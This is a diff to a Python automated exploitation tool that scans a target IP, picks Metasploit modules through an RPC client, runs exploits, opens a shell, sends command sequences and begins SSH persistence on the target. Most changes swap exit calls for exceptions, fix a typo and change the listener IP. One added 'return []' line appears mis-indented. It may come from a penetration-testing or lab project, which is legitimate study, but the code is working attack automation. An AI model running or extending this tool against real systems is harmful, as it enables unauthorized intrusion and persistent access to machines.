@@ -14,6 +14,7 @@ from logs import LOG
 import post.postexploit as postexploit
 import sys
 import re
+from pathlib import Path
 
 RED = "\033[1;31m"
 YELLOW = "\033[33m"
@@ -67,8 +68,9 @@ def show_pwnguin():
     )
 
 
+# TODO : Changer le exit par une exception
 def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
-    """Scans IP loofing for vulnerabilities and output the
+    """Scans IP looking for vulnerabilities and output the
     related exploit list to be parsed (in json)
     """
     if debug == 0:
@@ -77,6 +79,10 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         print("[i] Launching scan over @" + ip + " cmd :" + cmd)
         LOG(msg, logfile, "log")
         scan = subprocess.run(cmd, shell=True)
+
+        if "0 hosts up" in Path("./detect.xml").read_text():
+            raise Exception("HostIsDown")
+
         if scan:
             msg = "Scan over successfully"
             print("[V] Scan over successfully")
@@ -89,6 +95,7 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         msg = "Retrieving exploits"
         print("[i] Retrieving exploits")
         LOG(msg, logfile, "log")
+            return []
     with open(exploit_path, "r+") as f:
         result = json.loads(f.read())
     return result
@@ -153,9 +160,9 @@ def createExploitList(res=[]) -> tuple[list[str], list[str]]:
         titles = [pwn["Title"] for pwn in exploits]
         titles = [[k, title] for k, title in enumerate(titles)]
     else:
-        LOG("Error 2 : Parsing error.", logfile, "err")
-        print("[X] Error 2 : Parsing error.")
-        exit(-2)
+        LOG("Error 2 : Parsing error or no exploits.", logfile, "err")
+        print("[X] Error 2 : Parsing error or no exploits.")
+        return []
     LOG("Parsed ./exploit_list", logfile, "log")
     metaexploits = []
     for j in range(len(titles)):
@@ -210,7 +217,8 @@ def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
     if modules == []:
         LOG("Error 8 : Module error.", logfile, "err")
         print("[X] Error 8 : Module error, no module.")
-        exit(-8)
+        # raise Exception("NoModuleFound")
+        return []
     return modules
 
 
@@ -296,7 +304,7 @@ def exploitVuln(
     if client.sessions.list == {}:
         LOG("Error 9 : Exploit could not be executed", logfile, "err")
         print("[X] Error 9 : Exploit could not be executed")
-        exit(-9)
+        raise Exception("ExploitFailure")
 
 
 def getShell(client: MsfRpcClient = None, id="1"):
@@ -307,7 +315,8 @@ def getShell(client: MsfRpcClient = None, id="1"):
     except:
         print("[X] Error 10 : No shell created")
         LOG("Error 10 : No shell created", logfile, "err")
-        exit(-10)
+        raise Exception("ErrorWhileGettingShell")
+        # exit(-10)
 
 
 def sendCommands(shell, sequence=[]) -> int:
@@ -315,7 +324,7 @@ def sendCommands(shell, sequence=[]) -> int:
     if len(sequence) == 0:
         print("[X] Error 5 : Invalid sequence.")
         LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
-        exit(-5)
+        raise Exception("InvalidSequence")
 
     for command in sequence:
         print(command)
@@ -329,11 +338,11 @@ def flushProcesses() -> int:
     proc = subprocess.run(
         "kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True
     )
-    print(proc)
+    # print(proc)
     proc = subprocess.run(
         "kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')", shell=True
     )
-    print(proc)
+    # print(proc)
     return 0
 
 
@@ -440,7 +449,7 @@ if __name__ == "__main__":
 
     flushProcesses()
     Rhosts = "192.168.1.45"
-    Lhost = "192.168.1.37"
+    Lhost = "192.168.1.86"
 
     if len(sys.argv) > 1:
         IP = sys.argv[1]
@@ -448,14 +457,19 @@ if __name__ == "__main__":
         if len(sys.argv) > 2:
             Lhost = sys.argv[2]
 
-    (shell, client, srv) = autopwn(
-        Rhosts=Rhosts,
-        Lhost=Lhost,
-        generic_exploit=True,
-        get_edb_exploits=True,
-        com_and_cont=True,
-        auto_mode=True,
-    )
+    try : 
+        (shell, client, srv) = autopwn(
+            Rhosts=Rhosts,
+            Lhost=Lhost,
+            generic_exploit=True,
+            get_edb_exploits=True,
+            com_and_cont=True,
+            auto_mode=True,
+        )
+    except:
+        print("An error has occured.")
+        exit(-1)
+
     LOG("Begin setup for SSH persistence", logfile, "log")
     print("[~] Begin setup for SSH persistence")
     subprocess.run("./makesshkeys.sh", shell=True)
